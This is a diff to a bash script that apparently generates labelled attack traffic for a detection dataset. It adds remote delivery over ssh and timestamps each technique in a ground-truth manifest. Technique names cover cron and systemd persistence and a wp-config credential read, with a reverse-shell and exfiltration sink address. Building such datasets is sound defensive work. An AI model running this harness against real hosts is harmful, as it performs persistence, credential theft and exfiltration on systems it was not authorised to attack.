@@ -1,9 +1,14 @@
 #!/bin/bash
 # Attack traffic for the FACT dataset.
 #
-# Runs on the monitored host while the capture is running, normally launched by
-# orchestrate.sh --attacks. The sink for the reverse shell and the exfiltration
-# connects is opened by the caller; this script only talks to it.
+# Normally launched by orchestrate.sh --attacks. When SSH_TARGET is set the
+# script runs on the control machine and delivers every technique over its own
+# ssh connection, so the monitored host sees a remote login running commands
+# rather than a local script. With SSH_TARGET unset the techniques run in place,
+# which is what happens when the script already runs on the host.
+#
+# The sink for the reverse shell and the exfiltration connects is opened by the
+# caller; this script only talks to it.
 #
 # Every attack is given a unique tag that appears in the paths and arguments it
 # uses, and each run is appended to a JSONL manifest used as ground truth.
@@ -15,6 +20,7 @@ WP_DIR="${WP_DIR:-/usr/share/wordpress}"
 SINK="${SINK:-10.10.0.1:4444}"
 GAP="${GAP:-5}"
 MANIFEST="${MANIFEST:-/tmp/attacks-manifest.jsonl}"
+SSH_TARGET="${SSH_TARGET:-}"
 
 SUDO=""
 [ "$(id -u)" -ne 0 ] && SUDO="sudo"
@@ -100,6 +106,55 @@ cred_read() {
     $SUDO grep -RF "$TAG" "$WP_DIR/wp-config.php" >/dev/null 2>&1 || true
 }
 
+run_attack() {
+    local attack="$1"
+
+    if [ -z "$SSH_TARGET" ]; then
+        "$attack"
+        return
+    fi
+
+    # The technique body is shipped over stdin so the remote shell sees a plain
+    # `bash -s` invocation and no quoting has to survive the trip.
+    {
+        printf "TAG='%s'\n" "$TAG"
+        printf "WP_DIR='%s'\n" "$WP_DIR"
+        printf "SITE_URL='%s'\n" "$SITE_URL"
+        printf "SINK='%s'\n" "$SINK"
+        printf "SINK_HOST='%s'\n" "$SINK_HOST"
+        printf "SINK_PORT='%s'\n" "$SINK_PORT"
+        printf "SUDO='sudo -n'\n"
+        declare -f "${ATTACKS[@]}"
+        printf '%s\n' "$attack"
+    } | ssh -o BatchMode=yes "$SSH_TARGET" "bash -s -- $_DURATION $SITE_URL"
+}
+
+probe_target() {
+    if [ -z "$SSH_TARGET" ]; then
+        TARGET_HOSTNAME=$(hostname)
+        CLOCK_OFFSET=0
+        return
+    fi
+
+    local before after reply remote_now
+    before=$(date +%s%N)
+    reply=$(ssh -o BatchMode=yes "$SSH_TARGET" 'echo "$(hostname) $(date +%s%N)"') || {
+        log "cannot run commands on $SSH_TARGET; refusing to record attack windows"
+        exit 1
+    }
+    after=$(date +%s%N)
+    read -r TARGET_HOSTNAME remote_now <<<"$reply" || {
+        log "unexpected reply from $SSH_TARGET: $reply"
+        exit 1
+    }
+
+    # Attack windows are compared against event timestamps taken on the
+    # monitored host, so anchor them to its clock rather than ours.
+    CLOCK_OFFSET=$((remote_now - (before + after) / 2))
+}
+
+now_ns() { echo $(($(date +%s%N) + CLOCK_OFFSET)); }
+
 ATTACKS=(
     persist_cron
     persist_systemd
@@ -114,17 +169,25 @@ ATTACKS=(
     cred_read
 )
 
+probe_target
+
+if [ -n "$SSH_TARGET" ]; then
+    log "delivering attacks over ssh to $SSH_TARGET (clock offset ${CLOCK_OFFSET}ns)"
+else
+    log "running attacks in place"
+fi
+
 for attack in "${ATTACKS[@]}"; do
     TAG="atk-$attack-$(date +%s)-$RANDOM"
     log "running $attack ($TAG)"
 
-    start=$(date +%s%N)
-    "$attack" || log "$attack failed (continuing)"
-    end=$(date +%s%N)
+    start=$(now_ns)
+    run_attack "$attack" || log "$attack failed (continuing)"
+    end=$(now_ns)
 
     printf '{"technique":"%s","tag":"%s","start_ts_ns":%s,"end_ts_ns":%s,"hostname":"%s"}\n' \
         "$(json_escape "$attack")" "$(json_escape "$TAG")" "$start" "$end" \
-        "$(json_escape "$(hostname)")" >>"$MANIFEST"
+        "$(json_escape "$TARGET_HOSTNAME")" >>"$MANIFEST"
     sleep "$GAP"
 done
 
